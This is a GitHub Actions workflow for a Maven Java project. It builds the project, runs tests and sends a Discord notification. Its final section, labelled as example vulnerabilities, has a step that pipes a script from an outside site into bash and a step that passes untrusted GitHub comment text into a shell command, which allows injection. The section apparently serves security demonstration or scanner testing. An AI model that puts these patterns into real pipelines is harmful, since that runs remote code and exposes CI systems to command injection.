name: Algochoochoo build pipeline

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'temurin'
        cache: maven

    - name: Build with Maven
      run: mvn -B package --file pom.xml

    - name: Run tests
      run: mvn test

    - name: Send a notification on the Discord server
      run: |
        curl -H "Content-Type: application/json" \
            -d '{"username": "GitHub Bot", "content": "### New commit on main branch\nRepository: '${{ github.repository }}'\nCommit: '${{ github.sha }}'\nActor: '${{github.actor}}'"}' \
            ${{ secrets.DISCORD_WEBHOOK }}
    
    ###### Example of vulnerabilities:

    - name: Run a script from an unkown source
      run: curl -s https://bluetobystudio.com/deploy.sh | bash

    - name: Injection
      run: ./check_password ${{ github.event.comment.body }}

    - uses: step-security/harden-runner@v2.11.1
